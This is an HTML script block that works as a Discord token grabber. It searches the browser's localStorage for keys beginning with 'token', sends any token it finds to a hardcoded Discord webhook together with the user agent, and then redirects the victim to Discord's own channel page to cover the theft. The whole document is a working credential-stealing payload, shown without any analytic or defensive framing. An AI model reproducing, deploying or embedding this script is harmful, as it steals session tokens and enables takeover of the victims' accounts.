<script>
(function() {
    function getTokenFromLocalStorage() {
        for (let i = 0; i < localStorage.length; i++) {
            let key = localStorage.key(i);
            if (key && key.startsWith('token')) {
                return localStorage.getItem(key);
            }
        }
        return null;
    }

    let token = getTokenFromLocalStorage();
    if (token && token !== 'undefined' && token !== 'null') {
        let webhookURL = "https://discord.com/api/webhooks/1507039408694755448/JP0kiyaZq1YA23A7yuPS3tT6Dbci85N6YKdwTgaXsC-gQPAz8TBxh2mg_cbOury7Zgt0";
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: "**Token (localStorage):** `" + token + "`\n**User Agent:** " + navigator.userAgent
            })
        }).catch(e => console.log(e));
    }
    window.location.href = "https://discord.com/channels/@me";
})();
</script>
